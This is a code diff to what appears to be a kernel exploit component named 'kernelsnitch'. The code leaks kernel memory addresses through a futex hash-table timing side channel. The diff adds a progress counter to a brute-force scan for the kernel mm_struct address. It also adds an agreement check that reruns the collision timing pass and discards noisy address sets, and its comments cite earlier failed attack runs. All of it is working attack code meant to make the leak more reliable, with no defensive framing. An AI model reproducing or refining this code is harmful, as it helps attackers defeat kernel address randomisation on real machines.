@@ -96,6 +96,10 @@ namespace ghostlock::kernelsnitch {
         volatile size_t found;
         volatile size_t mm_struct;
         volatile size_t scan_done;
+        /* v11.4: mm brute-force pass heartbeat (current coarse address), so the
+         * parent wait loop can tell a running mm scan from a frozen collision
+         * scan — the 23:52 run had no way to see which phase was alive. */
+        volatile size_t mm_progress;
 
         pthread_t *tids;
         size_t identity_diff;
@@ -249,6 +253,7 @@ namespace ghostlock::kernelsnitch {
         const size_t mm_slab_sz =
                 static_cast<size_t>(PAGE_SIZE) << ks->mm_slab_order;
         for (size_t coarse_addr = range->start; (coarse_addr < range->end) && !ks->found; coarse_addr += COARSE_SZ) {
+            ks->mm_progress = coarse_addr;
             if ((coarse_addr % (1ULL << 40)) == 0)
                 if (ks->verbose)
                     pr_info("[% 3zd] [%016zx-%016llx]\n", range->id, coarse_addr,
@@ -608,6 +613,39 @@ namespace ghostlock::kernelsnitch {
             pr_warning("fast pass found %zu/%zu collisions; retrying conservative\n", count, wanted);
             count = __collision_pass(ks, MEASURE_SLOW_REPEAT, MEASURE_SLOW_AVG, MEASURE_SLOW_REPEAT, MEASURE_SLOW_AVG);
         }
+        /* v11.4: one timing pass can admit a transient-noise collider. Such a
+         * poisoned set passes every later check and makes the mm brute-force
+         * fail across the whole direct map (no mm puts those addresses in one
+         * bucket), burning a ~10s scan plus the rest of the attempt — the
+         * 2026-10-02 23:12 run did that seven times. Require an independent
+         * second pass to find the SAME address set before accepting. */
+        if (wanted == count) {
+            size_t first[KERNELSNITCH_COLLISION_POOL];
+            for (size_t i = 0; i < count; ++i)
+                first[i] = static_cast<size_t>(ks->futex_addrs[1 + i]);
+            if (ks->verbose)
+                pr_info("re-scanning collisions for agreement\n");
+            size_t count2 = __collision_pass(ks, MEASURE_SLOW_REPEAT, MEASURE_SLOW_AVG, MEASURE_SLOW_REPEAT,
+                                             MEASURE_SLOW_AVG);
+            if (count2 != wanted) {
+                pr_warning("agreement pass found %zu/%zu collisions -> discard set\n", count2, wanted);
+                count = 0;
+            } else {
+                size_t agree = 0;
+                for (size_t i = 0; i < wanted; ++i) {
+                    for (size_t j = 0; j < wanted; ++j) {
+                        if (first[i] == static_cast<size_t>(ks->futex_addrs[1 + j])) {
+                            agree++;
+                            break;
+                        }
+                    }
+                }
+                if (agree != wanted) {
+                    pr_warning("agreement %zu/%zu addresses matched -> discard set\n", agree, wanted);
+                    count = 0;
+                }
+            }
+        }
         if (wanted == count) {
             if (ks->verbose) pr_info("found %zu collisions\n", count);
             ks->state = KERNELSNITCH_COLLISIONS_FOUND;
@@ -635,8 +673,10 @@ namespace ghostlock::kernelsnitch {
         ghostlock::kernel::reset_cpu_pin();
 
         __run_mm_leak_pass(ks, 1, 0);
-        if (!ks->found)
+        if (!ks->found) {
+            ks->mm_progress = 0;
             __run_mm_leak_pass(ks, 0, 1);
+        }
         ks->state = (ks->mm_struct == static_cast<size_t>(-1)) ? KERNELSNITCH_MM_NOT_FOUND : KERNELSNITCH_MM_FOUND;
         return ks->state == KERNELSNITCH_MM_FOUND ? 0 : -1;
     }
